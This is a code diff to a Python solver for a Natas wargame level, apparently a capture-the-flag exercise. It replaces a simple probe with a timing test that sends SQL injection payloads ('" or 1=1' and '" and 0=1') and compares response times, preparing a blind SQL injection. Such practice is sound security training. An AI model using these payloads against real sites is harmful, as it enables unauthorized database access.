@@ -2,6 +2,7 @@
 """
 
 import requests
+import time
 from typing import Optional
 
 from natas_utils import *
@@ -16,16 +17,33 @@ def solve(url: str, login: LevelLogin) -> Optional[str]:
     #
     # A non-null "debug" param on a GET request will leak info about the query
     # that's executed.
-    params = {
-        "username": "\" OR 1=1",
-        "submit": "Check existence",
-        "debug": "true",
-    }
-    get_response = requests.get(url, auth=login, params=params)
-    print(get_response.text)
 
-    post_response = requests.post(url, auth=login, data=params)
-    print(post_response.text)
+    success_start = time.perf_counter()
+    for _ in range(10):
+        success_params = {
+            "username": "\" or 1=1",
+            "submit": "Check existence",
+            "debug": "true",
+        }
+        # no users output here because the `echo` lines are commented out in the
+        # source code
+        post_response = requests.post(url, auth=login, data=success_params)
+    success_end = time.perf_counter()
+
+    fail_start = time.perf_counter()
+    for _ in range(10):
+        fail_params = {
+            "username": "\" and 0=1",
+            "submit": "Check existence",
+            "debug": "true",
+        }
+        # no users output here because the `echo` lines are commented out in the
+        # source code
+        post_response = requests.post(url, auth=login, data=fail_params)
+    fail_end = time.perf_counter()
+
+    print(success_end - success_start)
+    print(fail_end - fail_start)
 
     return None
 
